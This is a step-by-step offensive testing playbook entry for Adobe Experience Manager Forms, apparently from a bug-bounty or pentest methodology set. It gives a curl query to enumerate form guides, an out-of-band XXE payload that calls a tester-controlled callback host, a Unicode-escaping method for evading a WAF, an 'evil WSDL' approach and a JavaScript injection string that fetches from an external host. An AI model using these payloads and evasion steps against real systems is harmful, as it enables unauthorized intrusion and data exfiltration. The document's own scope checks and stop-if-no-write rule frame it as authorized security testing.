# Batch 13 — Forms old XXE / JS (Egorov)

## GOAL
If old Forms “guide” pieces exist **and** you can write a node, test classic XXE/JS issues with **OOB only** first.

## TIME
~1–2 hours

## YOU NEED
- Batch 12 said Forms/guides exist  
- Write access somewhere (if not, stop after listing guides)  
- Collaborator URL (OAST)  
- Scope allows it  

---

## WHY (30 seconds)

Old research (Egorov / APSB19-48): form components parse **XML**.  
Bad XML parsers let you say “also open this file/URL” (**XXE**).  
Some also take weird JS fields.  

You need:
1. A guide container node type  
2. Often a place to **write** content  
3. The right selector (`af.internalsubmit`, `af.wsdl`, `af.submit`, …)

Versions differ. Prefer “callback to my server” over guessing files.

---

## DO THIS

### 1) List guides

```bash
curl -sk -G "$QB" \
  --data-urlencode "property=sling:resourceType" \
  --data-urlencode "property.value=fd/af/components/guideContainer" \
  --data-urlencode "p.limit=20" -o guides.json
head -c 500 guides.json; echo
```

### 2) If no write path — stop

```text
No write = do not force. Write "needs write" and go NEXT.
```

### 3) OOB XXE idea (POST to guide with af.internalsubmit when you have path)

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE afData [
<!ENTITY a SYSTEM "http://YOUR-OAST/xxe">
]>
<afData>&a;</afData>
```

Check OAST for hit.  
WAF blocks plain XML? Unicode-escape the whole string (`\u003c` style) — details in `reference/08-aem-forms.md`.

### 4) Time-box other selectors (max 30 min)

- `af.wsdl` + evil WSDL on your server  
- `af.submit` JS OOB: `');jQuery.get('http://OAST');//`

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| OAST hit | Finding. Optional careful file read if reflected |
| No write / no POST | Leave classic track |
| Standalone FormServer also open | → **14** |

---

## NEXT
→ [14-forms-modern-rce.md](./14-forms-modern-rce.md) if standalone  
else → [15-modern-ssrf-xxe.md](./15-modern-ssrf-xxe.md)
